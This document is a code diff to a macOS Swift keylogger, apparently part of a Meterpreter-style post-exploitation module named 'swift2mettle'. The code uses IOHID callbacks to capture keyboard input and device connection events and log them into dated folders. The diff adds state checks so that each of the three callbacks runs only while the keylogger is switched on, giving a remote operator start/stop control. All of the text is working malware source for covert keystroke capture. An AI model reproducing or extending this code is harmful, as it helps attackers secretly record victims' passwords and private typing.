@@ -8,6 +8,8 @@
 
 import Foundation
 import Cocoa
+import let swift2mettle.KEYLOGGER_STATE_START
+import func swift2mettle.keylogger_get_state
 
 class CallBackFunctions
 {
@@ -17,6 +19,10 @@ class CallBackFunctions
     
     static let Handle_DeviceMatchingCallback: IOHIDDeviceCallback = { context, result, sender, device in
         
+        if keylogger_get_state() != KEYLOGGER_STATE_START
+        {
+            return;
+        }
         let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
         let dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
         let path = mySelf.devicesData.appendingPathComponent(dateFolder)
@@ -48,6 +54,10 @@ class CallBackFunctions
     
     static let Handle_DeviceRemovalCallback: IOHIDDeviceCallback = { context, result, sender, device in
         
+            if keylogger_get_state() != KEYLOGGER_STATE_START
+            {
+                return;
+            }
             
             let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
             let dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
@@ -80,6 +90,11 @@ class CallBackFunctions
      
     static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in
         
+        if keylogger_get_state() != KEYLOGGER_STATE_START
+        {
+            return;
+        }
+
         let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
         let elem: IOHIDElement = IOHIDValueGetElement(device );
         var test: Bool
